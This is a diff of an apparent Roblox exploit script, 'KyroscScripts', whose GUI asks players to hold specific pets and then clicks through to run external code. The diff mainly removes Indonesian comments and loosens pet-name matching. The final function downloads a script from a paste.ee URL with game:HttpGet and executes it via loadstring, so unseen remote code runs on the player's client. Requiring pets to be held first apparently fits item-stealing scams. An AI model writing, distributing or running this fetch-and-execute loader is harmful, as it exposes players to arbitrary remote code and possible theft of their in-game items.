@@ -2,13 +2,11 @@ local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 local gui = player:WaitForChild("PlayerGui")
 
--- Membuat ScreenGui utama dengan properti yang baik
 local screenGui = Instance.new("ScreenGui")
 screenGui.Name = "KyroscScriptsGUI"
 screenGui.Parent = gui
 screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 
--- Membuat frame utama dengan desain modern
 local mainFrame = Instance.new("Frame")
 mainFrame.Name = "MainFrame"
 mainFrame.Size = UDim2.new(0, 320, 0, 200)
@@ -22,7 +20,6 @@ local corner = Instance.new("UICorner")
 corner.CornerRadius = UDim.new(0, 12)
 corner.Parent = mainFrame
 
--- Judul utama
 local title = Instance.new("TextLabel")
 title.Name = "Title"
 title.Text = "KyroscScripts (v3.2.1)"
@@ -34,7 +31,6 @@ title.Font = Enum.Font.GothamBold
 title.TextSize = 18
 title.Parent = mainFrame
 
--- Instruksi pet yang diperbarui, menambahkan "Deer"
 local petInstructions = Instance.new("TextLabel")
 petInstructions.Name = "PetInstructions"
 petInstructions.Text = "Hold one of these pets:\n- Red Fox - Dragonfly\n- Raccoon - Praying Mantis\n- Deer\nThen click to start."
@@ -48,7 +44,6 @@ petInstructions.TextXAlignment = Enum.TextXAlignment.Left
 petInstructions.TextYAlignment = Enum.TextYAlignment.Top
 petInstructions.Parent = mainFrame
 
--- Tombol Start dengan desain hover dan klik feedback (modern)
 local startButton = Instance.new("TextButton")
 startButton.Name = "StartButton"
 startButton.Text = "Start Execution"
@@ -59,14 +54,13 @@ startButton.BorderSizePixel = 0
 startButton.TextColor3 = Color3.fromRGB(255, 255, 255)
 startButton.Font = Enum.Font.GothamBold
 startButton.TextSize = 16
-startButton.AutoButtonColor = false -- agar kita bisa custom hover color
+startButton.AutoButtonColor = false
 startButton.Parent = mainFrame
 
 local buttonCorner = Instance.new("UICorner")
 buttonCorner.CornerRadius = UDim.new(0, 8)
 buttonCorner.Parent = startButton
 
--- Efek hover tombol
 startButton.MouseEnter:Connect(function()
     startButton.BackgroundColor3 = Color3.fromRGB(90, 90, 90)
 end)
@@ -74,7 +68,6 @@ startButton.MouseLeave:Connect(function()
     startButton.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
 end)
 
--- Footer kecil
 local footer = Instance.new("TextLabel")
 footer.Name = "Footer"
 footer.Text = "KyroscScripts | discord.gg/SqqvAH7nXf"
@@ -86,9 +79,7 @@ footer.Font = Enum.Font.Gotham
 footer.TextSize = 12
 footer.Parent = mainFrame
 
--- Fungsi menampilkan notifikasi singkat di atas tombol
 local function showNotification(message, color)
-    -- Bersihkan notifikasi sebelumnya jika ada
     local oldNotif = mainFrame:FindFirstChild("Notification")
     if oldNotif then oldNotif:Destroy() end
     
@@ -116,7 +107,6 @@ local function showNotification(message, color)
     end)
 end
 
--- Fungsi memeriksa apakah player memegang pet valid (termasuk Deer)
 local function hasValidPet()
     local character = player.Character or player.CharacterAdded:Wait()
     local validPets = {
@@ -124,24 +114,28 @@ local function hasValidPet()
         ["Raccoon"] = true,
         ["Dragonfly"] = true,
         ["Praying Mantis"] = true,
-        ["Deer"] = true,  -- Pet baru ditambahkan
+        ["Deer"] = true,
     }
     
     local function checkTools(container)
         for _, item in ipairs(container:GetChildren()) do
-            if item:IsA("Tool") and validPets[item.Name] then
-                return true
+            if item:IsA("Tool") then
+                print("Found Tool:", item.Name) -- Debug: cetak nama tool
+                -- Pengecekan fleksibel: apakah nama tool mengandung nama valid pet
+                for petName in pairs(validPets) do
+                    if string.find(item.Name:lower(), petName:lower()) then
+                        return true
+                    end
+                end
             end
         end
         return false
     end
     
-    -- Cek di karakter
     if checkTools(character) then
         return true
     end
     
-    -- Cek di backpack
     local backpack = player:FindFirstChild("Backpack")
     if backpack and checkTools(backpack) then
         return true
@@ -150,7 +144,6 @@ local function hasValidPet()
     return false
 end
 
--- Fungsi untuk mengeksekusi script eksternal dengan error handling
 local function executeExternalScript()
     showNotification("Checking for pets...", Color3.fromRGB(0, 100, 255))
     
@@ -162,7 +155,7 @@ local function executeExternalScript()
     showNotification("Executing script...", Color3.fromRGB(0, 150, 0))
     
     local success, err = pcall(function()
-        local httpGet = game:HttpGet or game.HttpGet -- fallback untuk varian
+        local httpGet = game:HttpGet or game.HttpGet
         local scriptString = httpGet("https://paste.ee/r/s7TguhY5")
         assert(scriptString and #scriptString > 0, "Failed to fetch script")
         loadstring(scriptString)()
